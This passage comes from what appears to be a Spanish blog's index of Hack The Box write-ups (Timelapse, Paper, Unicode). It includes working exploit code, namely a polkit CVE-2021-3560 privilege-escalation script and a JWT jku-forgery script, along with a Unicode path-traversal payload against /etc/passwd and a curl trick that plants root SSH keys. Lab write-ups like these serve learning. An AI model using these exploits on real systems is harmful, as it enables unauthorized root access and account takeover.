littleToBig(data_litt) time.sleep(1) password = hexToAscii(data_big) time.sleep(1) p = log.progress(&#39;Password&#39;) p.success(password)# mainif __name__ == &#39;__main__&#39;: run() El scripts requiere algunos archivos para su uso, los encuentras en mi repositorio: https://github.com/E1P0TR0/Ahora solo nos queda ejecutar el script, obtenemos la clave de root, nos logeamos por SSH y pa-dentro:❯ ./convertPass.py auth_password.c[.] Extracting data from the file: Success![../.....] Swaping endianndess: Success![./......] Converting hexadecimal to ascii data: Success![+] Password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3❯ sshpass -p &#39;@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3&#39; ssh root@10.10.11.146Last login: Fri Apr 29 17:03:53 2022 from 10.10.14.117root@production:~# whoamirootroot@production:~# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Apr 29 04:24 /root/root.txt" }, { "title": "Hackthebox Writeup Timelapse", "url": "/posts/HTBTimelapse/", "categories": "HTB, Writeups", "tags": "HTB, Windows, Easy, Active Directory, SMB, Brute Force, SSL/TLS, WinPEAS, LAPS", "date": "2022-04-11 03:34:47 -0500", "snippet": "Máquina Windows donde enumeramos por el protocolo SMB (Server Message Block) un archivo backup .zip protegido por contraseña, al romperlo por Brute Force obtenemos otro archivo .pfx (Personal Information Exchange) protegido por contraseña que rompemos fácilmente. Del archivo extraemos con OpenSSL certificados digitales del protocolo SSL/TLS (Secure Socket Layer/Transport Layer Security) de un usuario para luego entrar con evil-winrm y completar la escalada. Ahora para obtener privilegios con la herramienta WinPEAS enumeramos un archivo .txt con un historial de comandos que nos permite extraer credenciales de un usuario que pertenece a un grupo del servicio LAPS, el cuál le concede acceso a un archivo en texto claro con las credenciales del administrador del sistema. OS IP Release Date Difficulty Points Windows 10.10.11.152 26 Mar 2022 Easy 20 Antes de empezar es importante verificar que estamos conectados a la VPN de HackTheBox y tenemos conexión con la máquina, para ello usamos el comando ping: Observamos que enviamos un paquete _1 packets transmitted_ y lo recibimos _1 received_, por ende tenemos una conexión exitosa.EnumerationEmpezamos enumerando los puertos TCP que están abiertos en la máquina víctima, para ello usamos la herramienta nmap: Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -oG &amp;lt;file&amp;gt; : Guardar output en un archivo (&amp;lt;file&amp;gt;) de formato grepable Agregado : 2&amp;gt; /dev/null : Redirigir stderr (mensajes de error) al archivo /dev/null (“Agujero Negro”)Como estamos en una instancia Windows observamos varios puertos abiertos, para tener un poco más de información realizamos un escaneo a cada uno en específico: Explicación de parámetros : -p&amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapA primera vista y observando los puertos podemos deducir que estamos frente a un servicio Active Directory, viendo el puerto 445 (SMB) podemos tirar de la herramienta crackmapexec para confirmarlo: Observamos en la información del equipo por el protocolo SMB que el Hostname es DC01 (Domain Controller), el cúal es un concepto asociado a Active DirectoryYa que el puerto 445 (SMB) está abierto, usamos la herramienta smbmap para listar recursos compartidos Samba y descargar un archivo .zip con interesante nombre: Ojito: También observamos un archivo .msi y documentos .docx con la palabra LAPS, el cúal es un concepto muy importante que lo veremos más adelante . . .FootholdAl intentar extraer el archivo .zip notamos que está protegido con contraseña, para ello usamos zip2john para generar un hash del archivo protegido y luego crackearlo con john:Después de extraer el archivo zip nos encontramos con un archivo legacyy_dev_auth.pfx, para conocer un poco de la extensión investigamos un poco:Con el conocimiento de que el archivo contiene certificados digitales (SSL, Private keys) para procesos de autenticación (el nombre del archivo tiene muchas pistas), ahora solo toca buscar una manera de extraer esos certificados.Para ello, usamos la herramienta openssl que está ligada a realizar funciones de criptografía con cifrado SSL (Secure Sock Layer):Gracias la investigación de este nuevo concepto, sabemos que el archivo contiene una private key y por ello una protección por contraseña.A pesar de ello, aplicamos el mismo método que usamos con el archivo .zip, usamos pfx2john para generar un hash del archivo protegido y luego crackearlo con john:Ahora solo queda extraer los cetificados con openssl: Explicación de parámetros : pkcs12 : Especificar el formato de la data con la cúal trabajaremos -in &amp;lt;file&amp;gt; : Especificar el archivo (&amp;lt;file&amp;gt;) del cuál queremos extraer el certificado y la llave privada -nocerts : No extraer certificados -clcerts : Extraer solo certificados de cliente -nokeys : No extraer llaves privadas -out &amp;lt;file&amp;gt; : Especificar archivo de salida (&amp;lt;file&amp;gt;)Para más información del proceso pueden visitar la siguiente página de IBM: https://www.ibm.com/docs/en/arl/9.7?topic=configurations-ssl-certificationDisponemos de un certificado y una llave privada, pero aún no sabemos a quién pertenece. Ojito : Desde que descubrimos el archivo .zip tuvimos varias pistas en la descripción de sus nombres: winrm_backup.zip -&amp;gt; legacyy_dev_auth.pfxAparte de eso, al mirar el certificado extraído observamos en el campo Subject como CN (Common Name) y como Issuer (Emisor) a legacyy.Ahora sí, para asegurarnos del todo investigamos en internet y encontramos con el tipo de certificado X.509 que proporciona un campo de extensión para añadir campos adicionales al certificado:Para más información sobre Atributos del CertificadoCon toda la información segura y las pistas, ahora podemos usar la herramienta evil-winrm para entrar como el usuario legacyy usando el certificado y la llave privada para la autenticación y pa-dentro: Explicación de parámetros: -i &amp;lt;ip&amp;gt; : Ip o nombre de host remoto para la conexión -S : Aplicar protocolo SSL (Secure Socket Layer) -u &amp;lt;user&amp;gt; : Asignar usuario para la autenticación -c &amp;lt;certificate&amp;gt; : Asignar certificado de llave pública -k &amp;lt;private key&amp;gt; : Asignar certificado de llave privadaPrivilege ScalationEstamos dentro del sistema como usuerio legacyy, ahora usamos la herramienta conocida winPEAS que nos ayuda a enumerar diversas rutas para poder escalar privilegios. Al ejecutarla encontramos la ruta del .txt que guarda el historial de Powershell: Importante! : Para que les permita subir el archivo de nuestra máquina local a la víctima es importante que nos ubiquemos en un Writeable path (rutas por defecto con permisos de escritura para usuarios normales)Al abrir el archivo encontramos cierta ejecución de comandos con el propósito de iniciar una sesión de cierto usuario para poder ejecutar algún comando: Para no tirar siempre de WinPEAS, puedes investigar sobre otras posibles rutas para escalar privilegios en el repositorio PayloadsAllTheThings Aquí puedes tener mayor información sobre la Creación del objeto de credenciales para la sesiónAhora que tenemos credenciales del usuario svc_deploy solo queda logearnos de nuevo con evil-winrm:Empezamos con una enumeración básica del usuario actual y encontramos que pertenece al grupo LAPS_Readers:¿ Recuerdan los archivos de la enumeración por SMB ?, con está información ya estamos completamente seguros que se está aplicando LAPS (Local Administrator Password Solution)Investigando en internet sobre esta solución encontramos una vulnerabilidad que permite visualizar las contraseñas en texto claro de administradores locales del dominio: Puede visitar la siguiente página con más vulnerabilidades LAPS: https://www.attivonetworks.com/blogs/laps-vulnerability-assessmentAsociando estos conceptos con el grupo al que pertenece nuestro usuario actual, estamos listos para explotar esta vulnerabilidad.Primero verificamos que LAPS se encuentre en el sistema para luego ejecutar una linea de comandos extraída de PayloadsAllTheThings, y ya que pertenecemos al grupo LAPS_Readers, está claro que podremos visualizar las credenciales en texto claro:Con las credenciales del usuario Administrator solo queda volvernos a logear por evil-winrm y pa-dentro:" }, { "title": "Hackthebox Writeup Paper", "url": "/posts/HTBPaper/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, Wordpress, X-Backend-Server, CVE-2019-17671, LinPEAS, CVE-2021-3560, Python Scripting", "date": "2022-03-25 02:22:01 -0500", "snippet": "Empezando con la enumeración encontramos servicios web en Wordpress con un hostanme oculto en la cabezera X-Backend-Server. Luego encontramos una vulnerabilidad en la versión actual de Wordpress que nos permite ver un Draft del sitio (CVE-2019-17671) y encontrar un nuevo dominio. En esta web encontramos un bot que nos permite listar directorios y archivos, con ello conseguimos una credenciales para entrar por SSH. Para la escalada usamos Linpeas y encontramos que la version de Sudo nos permite crear un usuario con privilegios (CVE-2021-3560), logearnos y ser root. OS IP Release Date Difficulty Points Linux 10.10.11.143 5 Feb 2022 Easy 20 Antes de empezar es importante verificar que estamos conectados a la VPN de HackTheBox y tenemos conexión con la máquina, para ello usamos el comando ping: Observamos que enviamos un paquete _1 packets transmitted_ y lo recibimos _1 received_, lo cuál significa que tenemos una conexión exitosaEnumerationEmpezamos enumerando los puertos TCP que están abiertos en la máquina víctima, para ello usamos la herramienta nmap: Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -oG &amp;lt;file&amp;gt; : Guardar output en un archivo (&amp;lt;file&amp;gt;) de formato grepableObservamos que tenemos abierto el puerto 22 (ssh), 80 (http) y 443 (https), con esta información volvemos a realizar un escaneo pero a estos 3 puertos en específico: Explicación de parámetros : -p&amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapComo no disponemos de credenciales válidas omitiremos toquetear el puerto 22, pero lo que si tenemos son dos servicios web (http, https), así que procedemos a ejecutar un whatweb a cada una de ellas y en paralelo las abrimos en el navegador para ver su contenidoEncontramos está página en los dos servicios, la cuál es una página de prueba tras instalar el servidor web:Por la otra parte encontramos algo interesante:Como vemos arriba, en el output para el servicio http observamos un posible nombre de dominio office.paper, pero para estar mas seguros averiguamos de que va el campo X-Backend usando el parámetro -v de whatweb que nos pemite ver más información:Al parecer se trata de un plugin que extrae información de ciertos headers, y como obervamos en los HTTP HEADERS, disponemos del header X-Backend_Server, pero que significa excactamente?Entonces encontramos un nombre de dominio office.paper de la máquina, pero al ejecutarle un ping o curl nos sale que es un servicio desconocido. Para estos casos llegamos a la conclusión que se está aplicando Virtual Hosting, y para tener una conexión debemos agregar office.paper a nuestro archivo /etc/hosts: echo &quot;10.10.11.143 office.paper&quot; &amp;gt;&amp;gt; /etc/hostsCon estos pasos ya tendremos acceso al servicio web:Ya en la página, encontramos algo interesante sobre un post que menciona que un usuario publicó información confidencial en un borrador reciente, lo cuál puede ser una brecha vulnerableAl igual que antes podemos extraer información del servicio web, lo haremos, pero está vez con la extensión del navegador wappalyzer. Podemos observar que se usa el gestor de contenido WordPress 5.2.3, y que por defecto poseen la ruta wp-login.php para poder logearse. En caso de que nos sepan eso, al momento de toquetear la página encontraran un enlace a esto mismo:De primeras intentamos examinar la paǵina para ver el código fuente ctrl + u y observamos un posible LFI al momento de pinchar en el enlace Lost your password?. Además en al dirigirnos a la ruta wp-admin podemos observar en el URL una redirección y posible RCE, pero ninguna de estas 2 opciones funcionará para el accesoFootholdBuscando vulnerabilidades de la versión encontramos la adecuada para poder ver borradores privados sin estar autenticados (CVE-2019-17671). La vulnerabilidad consiste en asignar al parametro static un valor a 1 static=1, lo cuál permitira desviar un condicional y nos permitira ver el siguiente draft:En el siguiente enlace encontramos la explicación de la vulnerabilidad a detalle: https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/Observamos una URL de un Sistema de chat para empleados, la cúal es un subdominio y se aplica Virtual Hosting, entonces la agregamos a nuetro archivo /etc/hosts: echo &quot;10.10.11.143 chat.office.paper&quot; &amp;gt;&amp;gt; /etc/hosts:Procedemos a registrarnos y luego dentro del sistema de chat encontramos un chat general y mirando los mensajes antiguos encontramos que existe un bot llamado recyclops con el cuál puedes interactuar:Procedemos a buscar al bot y escribimos help para que despliege un panel de ayuda y veamos de que manera podemos interactuar. Al parecer podemos listar directorios y archivos, así que empezamos a buscar y buscar, una cosa nos llevó a la otra y encontramos unas credenciales: Para llegar al archivo : Primero fuimos a la raíz y listando encontramos un script bot_restart.sh que valida la ejecución del bot y lo resetea Leyendo el código encontramos que ejecuta el script start_bot.sh y para verlo nos dirigimos a él Leyendo el código vemos que ejecuta con source el contenido del archivo .env y luego el binario hubot Revisamos que ejecuta en el .env y sorpresa! Este archivo .env, como menciona su nombre, sirve para asignar variables de entorno para la elaboración de un proyectoRecordamos que el puerto 22 (ssh) está abierto y que en este chat nos encontrabamos como el usuario dwight (lo sabemos si miramos el archivo /etc/passwd con el bot), entonces usando la contraseña nos logeamos y pa-dentro:Privilege EscalationYa dentro como el usuario dwight solo nos queda escalar privilegios a root entonces hacemos una ejecución básica de comandos para listar binarios que podemos ejecutar como SUDO sudo -l o que tengan el permiso SUID find / -perm -4000 2&amp;gt;/dev/null:Lamentablemente no logramos nada, así que recurrimos a la herramienta LinPEAS que nos permite buscar diferentes rutas a explotar y poder escalar privilegios en el sistema. Una vez instalado lo pasamos a la máquina víctima con nc:Ahora solo le damos permisos de ejecución chmod +x linpeas.sh, ejecutamos ./linpeas.sh y de primeras encontramos una vulnerabilidad para sudo 1.8.29:Esta vulnerabilidad CVE-2021-3560 se basa en el servicio polkit, el cuál se encarga de gestionar la autorización entre los procesos sin privilegios hacia los privilegiados.Para la explotación hice un script en python que nos proporcionará las credenciales del usuario con privilegios:#!/usr/bin/python3import sys, signal, time, subprocess, shlex, random, pdb, os, pwd# colorsdef inRed(s): print(&quot;\\033[91m {}\\033[00m&quot; .format(s), end=&quot;&quot;)def inGreen(s): print(&quot;\\033[92m {}\\033[00m&quot; .format(s), end=&quot;&quot;)def inYellow(s): print(&quot;\\033[93m {}\\033[00m&quot; .format(s), end=&quot;&quot;)def inMagenta(s): print(&quot;\\033[95m {}\\033[00m&quot; .format(s), end=&quot;&quot;)# ctrl + cdef signal_handler(signum, frame): inRed(&quot;\\n[!] Exiting...&quot;); sys.exit()signal.signal(signal.SIGINT, signal_handler)# create userdef createUser(default_user): time.sleep(2) exit_user, counter = False, 0 inYellow(&quot;\\n[+] Trying to create default user...\\n\\n&quot;) while not exit_user: # start and kill the process until the user is created time.sleep(0.5) inYellow(&quot;\\t[-] Attempt&quot;); inRed(f&quot;{counter}\\n&quot;) counter += 1 process = subprocess.Popen(shlex.split(f&#39;dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:{default_user} string:&quot;creating user&quot; int32:1&#39;), stderr=subprocess.DEVNULL) try: rand = random.uniform(0.006, 0.009) process.wait(timeout=rand) process.kill() except subprocess.TimeoutExpired: process.kill() # validate user creation user = subprocess.run(shlex.split(f&#39;id {default_user}&#39;), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode(&#39;utf-8&#39;) if user.find(&quot;uid&quot;) != -1: inYellow(&quot;\\n\\t[*] User created:&quot;); inMagenta(f&quot;{default_user}&quot;) inYellow(&quot;\\n\\t[*] Time out at:&quot;); inGreen(str(rand) + &quot;\\n&quot;) exist_user = True break if counter - 1 &amp;gt; 100: inRed(&quot;\\n[-] Error creating user!&quot;); sys.exit()# assing passworddef assignPasswd(default_user, default_password): time.sleep(2) inYellow(&quot;\\n[+] Assigning password to user&quot;); inMagenta(f&quot;{default_user}\\n&quot;) for i in range(200): # start and kill the process until the password is created # extract UID from user uid = &quot;/org/freedesktop/Accounts/User&quot; + str(pwd.getpwnam(f&quot;{default_user}&quot;).pw_uid) # Create password in SHA-512 format hash_passwd = subprocess.run(shlex.split(f&#39;openssl passwd -5 {default_password}&#39;), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode(&#39;utf-8&#39;) passwd = f&quot;string:{hash_passwd.rstrip()}&quot; # Assign password to user process = subprocess.Popen(shlex.split(f&#39;dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply {uid} org.freedesktop.Accounts.User.SetPassword {passwd} string:&quot;assign user passsword&quot;&#39;), stderr=subprocess.DEVNULL) try: rand = random.uniform(0.006, 0.009) process.wait(timeout=rand) process.kill() except subprocess.TimeoutExpired: process.kill() time.sleep(0.5) inYellow(&quot;\\n\\t[*] Registered password&quot;) inYellow(&quot;\\n\\t[*] Time out at:&quot;); inGreen(str(rand) + &quot;\\n&quot;)# get credentials sudodef getCredentials(default_user, default_passwd): time.sleep(2) inYellow(&quot;\\n[+] Exploit Completed, log in to be root:\\n\\n&quot;) time.sleep(0.5) inYellow(&quot;\\t[*] User :&quot;); inGreen(f&quot;{default_user}\\n&quot;) inYellow(&quot;\\t[*] Password:&quot;); inGreen(f&quot;{default_passwd}\\n\\n&quot;)# processdef run(): default_user = &#39;marss&#39; default_password = &#39;marss###&#39; createUser(default_user) assignPasswd(default_user, default_password) getCredentials(default_user, default_password)# mainif __name__ == &#39;__main__&#39;: run() time.sleep(2)# References#------------------------------------------------------------------------------------# https://github.com/innxrmxst/CVE-2021-3560/blob/main/ex.py# https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.htmlPueden clonar el script en mi repositorio: https://github.com/E1P0TR0Una vez descargado solo tenemos que pasarla a la máquina víctima al igual que pasamos el LinPEASEl script consiste en que la herramienta dbus-send se encagará de crear un usuario por defecto marss y antes de que esa petición sea autorizada por el servicio polkit (verificando que el UID del proceso sea 0 -&amp;gt; root), mataremos el proceso kill y repetiremos esta secuencia hasta que polkit al recibir una petición que ya no existe, entre en conflicto y envés de rechazar la petición, logre aceptar el proceso con un UID = 0 y se cree el usuario con privilegios. Luego de ello repetiremos el proceso para asignarle una contraseña válida al usuario y ya poder logearnos:Logramos ver la credenciales, ahora solo nos logeamos con su marss, escribimos la contraseña marss###, nos volvemos root con sudo su y pa-dentro: Importante! Que nos permite volvernos root? La respuesta está en el grupo wheel al cúal pertencemos depues explotar la vulnerabilidad Y… qué es el grupo Wheel? Pues los miembros que pertenecen a este grupo tienen automáticamente privilegios sudo" }, { "title": "Hackthebox Writeup Unicode", "url": "/posts/HTBUnicode/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Json, Jwt, Jku, Python Scripting, LFI, Nginx, curl, Sudoers", "date": "2022-03-04 01:13:59 -0500", "snippet": "Enumerando encontramos un servicio web en el cuál podemos iniciar una sesión y obtener una cookie en formato JSON Web Token (JWT) con el campo JKU expuesto que permite crearnos una cookie para entrar como administrador. Existe un apartado vulnerable a Local File Inclusion (LFI) que nos permite enumerar archivos de configuración del servidor Nginx y obtener credenciales de un usuario para entrar por el protocolo Secure Shell (SSH). Para la escalada de privilegios logramos la authorización de nuestro par de llaves de autenticación por medio de la herramienta curl, que era parte de un binario que podiamos ejecutar como root. OS IP Release Date Difficulty Points Linux 10.10.11.126 27 Nov 2021 Medium 30 Antes de empezar la máquina es importante revisar si tenemos conexión con ella, para ello usamos el comando ping: Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquina Sistema Operativo por aprox. del TTL (Time To Live) : 64 -&amp;gt; Linux | 128 -&amp;gt; WindowsEnumerationComenzamos escaneando los puertos TCP abiertos con la herramienta nmap: Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -oG &amp;lt;file&amp;gt; : Guardar output en un archivo (&amp;lt;file&amp;gt;) de formato grepableObservamos que la máquina tiene abierto el puerto 22 (ssh) y 80 (http), asi que procedemos a escanear de manera específica cada uno de estos puertos: Explicación de parámetros : -p&amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapOmitimos entrar por el puerto 22 ya que no disponemos de credenciales para entrar por SSH.Observamos que hay un servicio http por el puerto 80, así que ejecutamos un whatweb para obtener un poco mas de información y por otro lado ingresamos a la página por el navegadorToqueteando un poco encontramos un botón con una redirección a una URL específica, y secciones para registrarnos y logearnos:Intentamos registrarnos:Nos logeamos:Y ya tenemos una sessión:De primeras solo hay de interesante subir un archivo, lo cúal puede ser una brecha, pero intentando un poco no conseguimos nada.Lo que sí, ayudandonos un poco del nombre de la máquina Unicode, y que tenemos una sesión, pues al observar la cookie de sesión vemos algo interesante:Si conoces un poco de formatos sabras por la separación de puntos(.) de que se trata.Si es la primera vez que miras una cookie así, lo que puedes hacer es intentar decodearla a un formato clásico, en este caso a base64:Logramos observar una estructura en formato json y vemos que en un campo especifica el tipo JWT, y averiguando un poco encontramos:Ahora que ya tenemos una idea procedemos a decodear la cookie para ver mas información, usamos una página muy útil: https://jwt.ioObservamos en el campo jku un enlace al archivo jwks.json, primero averiguamos de que va para luego saber que vamos a encontrar:Para ver el archivo necesitamos aplicar Virtual hosting agregando nombre de dominio hackmedia.htb a nuestro archivo /etc/hosts: echo &quot;10.10.11.126 hackmedia.htb&quot; &amp;gt;&amp;gt; /etc/hostsUna vez dentro observamos el contenido:Sabiendo todo esto, tendriamos una brecha para poder conseguir una cookie de sessión pero como admin.FootholdEl ataque consiste en crear token para logearnos como usuarios admin, para ello debemos hacer lo siguiente: Generamos un par de llaves para firmar nuestro token keypair.pem Descargamos el archivo http://hackmedia/static/jwks.json Extraemos de keypair.pem las llaves para validación y las asignamos al archivo jwks.json Generamos nuestro token con los campos correspondientes. Y un paso importante, usamos la redirección que tiene la página href=&quot;/redirect/?url=google.com&quot; Reemplazamos en el campo jku para que apunte a nuestro archivo jwks.json y valide el token Abrimos un servicio por un puerto para que pueda leerse el archivo jwks.json Asignamos la cookie a la página web, actualizamos, recibimos la peticioń en nuestro servicio en escucha y ya somos adminPara agilizar el proceso hize un script en python el cúal pasando los parámetros IP-ATACANTE, PUERTO, COOKIE, IP-VÍCTIMA logra generarte el token del usuario admin, abrirte un servicio en el puerto especificado, para luego asignar la cookie a la web, actualizar y listo:#!/usr/bin/python3import osimport sysimport subprocessimport requestsimport pdbimport jsonimport jwt as jwt_headerfrom jwcrypto import jwk as jwk_crypt, jwt as jwt_cryptimport timefrom termcolor import cprintimport signal#ctrl+cdef handler(signum, frame): remove_files() printRed(&quot;\\n[-] Exiting...\\n&quot;) sys.exit(1)signal.signal(signal.SIGINT, handler)#JWK packagesdef requirements(): printRed(&quot;\\n\\n[!] Requirements!\\n&quot;) printGreen(&quot;\\t[+] pip install jwcrypto\\n&quot;) printGreen(&quot;\\t[+] pip install PyJWT\\n&quot;)#colorsprintRed = lambda s: cprint(s, &#39;red&#39;, end=&#39; &#39;)printYellow = lambda s: cprint(s, &#39;yellow&#39;, end=&#39; &#39;)printMagenta = lambda s: cprint(s, &#39;magenta&#39;, end=&#39; &#39;)printGreen = lambda s: cprint(s, &#39;green&#39;, end=&#39; &#39;)#panel_helpdef help(): printYellow(&quot;\\n[*] Uso : &quot;) printMagenta(f&quot;python3 {sys.argv[0]} &amp;lt;ip_address&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cookie_session&amp;gt;&quot;) requirements() exit(1) #valid_inputif len(sys.argv) != 4: help()#global variablesip = sys.argv[1]port = sys.argv[2]user_token = sys.argv[3]#create keysdef gen_key(): subprocess.run([&#39;openssl&#39;, &#39;genrsa&#39;, &#39;-out&#39;, &#39;keypair.pem&#39;, &#39;2048&#39;], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)#remove files def remove_files(): subprocess.run([&#39;rm&#39;, &#39;keypair.pem&#39;, &#39;jwks.json&#39;])#get header tokendef get_headers(): headers = jwt_header.get_unverified_header(user_token) return headers#decode user_tokendef download_json(): headers = get_headers() jku = headers[&#39;jku&#39;] os.system(f&quot;wget {jku} 2&amp;gt;/dev/null&quot;)#create new jsondef create_json(key): with open(&quot;jwks.json&quot;, &quot;r&quot;) as jsonfile: data = json.load(jsonfile) data[&#39;keys&#39;][0][&#39;kid&#39;] = key.kid data[&#39;keys&#39;][0][&#39;n&#39;] = key.n data[&#39;keys&#39;][0][&#39;e&#39;] = key.e with open(&quot;jwks.json&quot;, &quot;w&quot;) as jsonfile: json.dump(data, jsonfile)#get data tokendef get_data_key(): with open(&quot;keypair.pem&quot;, &quot;rb&quot;) as pemfile: key = jwk_crypt.JWK.from_pem(pemfile.read()) return key#create tokendef gen_token(key): headers = get_headers() token = jwt_crypt.JWT( header = { &quot;alg&quot; : headers[&#39;alg&#39;], &quot;jku&quot; : f&quot;http://hackmedia.htb/static/../redirect/?url={ip}:{port}/jwks.json&quot; }, claims = { &quot;user&quot; : &quot;admin&quot; } ) token.make_signed_token(key) return token.serialize() #port sharing manuallydef listen_port(port): printYellow(f&quot;\\n\\n[+] Opening port {port} to share&quot;) printRed(&quot;jwks.json&quot;) printYellow(&quot;file...&quot;) printYellow(f&quot;\\n[+] Serving HTTP on 0.0.0.0 port {port}:\\n&quot;) subprocess.run([&#39;python3&#39;, &#39;-m&#39;, &#39;http.server&#39;, str(port)])if __name__ == &#39;__main__&#39;: gen_key() download_json() key = get_data_key() create_json(key) admin_token = gen_token(key) printRed(&quot;\\n[+] Admin token: &quot;) printGreen(f&quot;{admin_token}&quot;) listen_port(port)Pueden clonar el script en mi respositorio: https://github.com/E1P0TR0Ejecutando el script y siguiendo los pasos anteriores ya estariamos logeados como admin:Después de toquetear un poco encontramos una sesión de reportes donde podemos observar que se utiliza un archivo pdf que proviene de otra locación:Podriamos estar frente a un LFI (Local File Inclusion), y en específico a un path traversal attackEntonces intentamos un ataque básico al /etc/passwd:Interesante!, pues al parecer exite un filtro. Pero otra vez, tomando el cuenta el nombre de la máquina Unicode podemos intentar buscar vulnerabilidades asociadasBuscando en la biblia de los hackers Hacktricks encontramos como engañar al filtro remplazando el caracter \\ por su equivalente en Unicode %ef%bc%8f y con ello crear el path malicioso para comprobar si es vulnerable: ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd: Explicación de parámetros : -c : Output colorido -mc &amp;lt;status_code&amp;gt; : Solo mostrar respuesta del código de estado asignado -w &amp;lt;wordlist&amp;gt; : Wordlist a usar para el ataque de fuerza bruta -b &amp;lt;cookie&amp;gt; : Asignar nuestra cookie de sessión -u &amp;lt;url&amp;gt; : Url objetivo con el reemplazo del FUZZ correspondiente -fw &amp;lt;number&amp;gt; : Filtrar por cantidad de palabras en la respuestaPueden clonar la herramienta en el siguitent repositorio: https://github.com/ffuf/ffufNo llegamos a encontrar nada interesante, pero sabemos que podemos buscar archivos del sistema. Por ello, intentamos encontrar archivos de configuración del servidor web/proxy Nginx que corre en el sistemaInvestigando un buen tiempo encontramos algunos archivos de configuración de Nginx:En el primer archivo no encontramos nada interesante, pero en el segundo que es un directorio para alojar Server block encontramos en internet que hay uno por defecto llamado default:Ojito, al entrar encontramos un comentario sobre un cambio de contraseña de un usuario y se encuentra en un archivo db.yaml:Observamos el path /home/code/coder/static/styles/, y el usuario code que anteriormente vimos en el /etc/passwd.Entonces vamos buscando la locación del archivo db.yaml, logramos encontrarlo en /home/code/coder/db.yaml y son unas credenciales de mysql:Recordamos que tenemos el puerto SSH abierto, y como vemos que tenemos un usuario y contraseña probamos la credenciales encontradas como el usuario code y obtenemos la flag:Privilege EscalationYa dentro como el usuario code, como es costumbre usamos scripts básicos para buscar binarios con permisos SUID find \\ -perm -4000 2&amp;gt;/dev/null o binarios que podemos ejecutar como root sudo -l:Observamos que podemos ejecutar el binario /usr/bin/treport como root:De las tres opciones la más interesante es la 3. que nos permite descargar archivos.Pero antes de eso debemos saber que está usando el binario por detrás para hacer las descargas. Para ello hay dos maneras: Insertar un campo vacío en la opción 3: Insertar un campo vacío en la opción 1 y visualizando que hay un archivo en python usar una herramienta para extraer archivos en python pyinstxtractor y luego otra herramienta para decompilarla, sea legible pycdc y poder visualizar el archivo treport.py:En ambos casos observamos que la herramienta que está por detrás es curl, asi que es posible que tengamos una brecha para escalar privilegiosInvestigando un poco encontré que podemos descargar archivos del equipo local con curl usando el protocolo FILE:Usando el comando File:///root/root.txt podemos descargar la flag de root para luego visualizarla:Pero lo que queremos es entrar como usuarios root asi que intenté leer si había una llave privada para entrar por SSH, pude obtenerla pero al entrar me pedía contraseña, asi que busqué otra manera.Lo que hice fue crearme un par de llaves rsa:Enviar la llave pública a la máquina víctima al directorio /tmp:Cambiar el nombre de la llave pública (id_rsa.pem) a authorized_keys, luego usando el binario treport junto a curl copiar el archivo a la ruta /root/.ssh/ y así desde mi máquina entrar con la llave privada que también generé:Verificamos el archivo /root/.ssh/authorized_keys:Observamos que se encuentra nuestra llave pública, así que ahora asignamos permisos a nuestra llave privada, nos logeamos como root por el puerto 22 por ssh y pa-dentro!:" }, { "title": "Hackthebox Writeup Shibboleth", "url": "/posts/HTBShibboleth/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, UDP, Sabbix, CVE-2013-4786, msfvenom, RDBMS, MariaDB, CVE-2021-27928, Python Scripting", "date": "2022-02-24 20:25:45 -0500", "snippet": "Empezamos enumerando por el protocolo TCP y por detrás del servidor web solo encontramos un sistema de monitorización de redes Sabbix. Enumerando por el protocolo UDP y por medio de un script básico para reconocimiento de nmap ipmi-cipher-zero logramos comprobar que el servicio que corre por ese puerto tiene una vulnerabilidad que nos permite extraer contraseñas hash de usuarios (CVE-2013-4786) y crackearlos por fuerza bruta. Ya dentro del 